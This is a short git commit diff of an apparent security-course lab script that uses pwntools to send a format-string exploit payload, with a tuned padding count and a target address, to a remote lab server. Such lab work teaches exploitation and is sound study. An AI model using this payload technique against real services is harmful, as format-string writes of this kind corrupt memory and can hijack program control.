cc851e11404c659bb0f47607e72f5cae005c801f
aditya <anitp2018@gmail.com>
2023-03-18 20:18:28 -0700

    ch1

--- week-7/w7-lab.py
+++ week-7/w7-lab.py
@@ -3,7 +3,8 @@ from pwn import *
 
 io =  remote('107.21.135.41', 7777)
 # io =  process('./format_string')
-buf = b"%04196716d%8$lnA" + p64(0x601040) + b"\n"
+# buf = b"%04196716d%8$lnA" + p64(0x601040) + b"\n"
+buf = b"%04196708d%8$lnA" + p64(0x601040) + b"\n"
 io.recvuntil(b"Say something...")
 io.sendline(buf)
 io.recvuntil(b"ASURITE?\n")
